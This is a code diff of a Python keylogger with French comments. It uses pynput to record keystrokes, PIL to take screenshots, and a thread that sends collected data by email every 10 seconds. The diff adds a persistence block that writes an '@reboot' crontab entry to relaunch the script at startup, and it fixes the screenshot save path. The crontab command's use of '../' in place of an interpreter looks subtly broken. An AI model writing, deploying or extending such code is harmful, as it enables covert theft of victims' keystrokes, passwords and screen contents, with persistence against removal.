@@ -1,14 +1,41 @@
 import logging
 from threading import Thread
 from pynput.keyboard import Key, Listener
-import smtplib, ssl
+import smtplib,ssl
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-import time
+import subprocess
 import PIL.ImageGrab
+import time
 import os
+
+
+#--------DÉBUT TÂCHES PROGRAMMÉES---------------
+
+# Chemin vers le script Python
+python_script = os.getcwd()+'/keylogger'
+
+path_env = '../'
+
+# Commande crontab pour exécuter le script Python au démarrage avec temporisation et affichage graphique
+cron_job = f"@reboot sleep 30 && DISPLAY=:0 {path_env} {python_script} >> /home/ubuntu/cronlog.txt 2>&1"
+
+# Obtenir la crontab actuelle de l'utilisateur
+current_cron = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
+
+# Vérifier si le script est déjà dans la crontab
+if cron_job not in current_cron.stdout:
+    # Ajouter la nouvelle tâche à crontab
+    new_cron = current_cron.stdout + cron_job + "\n"
+    subprocess.run(['crontab', '-'], input=new_cron, text=True)
+    print("Le script Python a été ajouté à crontab pour être exécuté au démarrage.")
+else:
+    print("Le script Python est déjà dans crontab.")
+
+#--------FIN TÂCHES PROGRAMMÉES----------------
+
 
 #--------DÉBUT PARTIE ENVOI MAIL----------------
 
@@ -80,7 +107,8 @@ def on_press(key):
 def screen():
     screen = PIL.ImageGrab.grab()
     path = os.getcwd()
-    screen.save(path,"/screen.png")
+    path+="/screen.png"
+    screen.save(path)
 
 # Fonction pour exécuter `sendMail` toutes les 10 secondes dans un thread séparé
 def mail_thread():
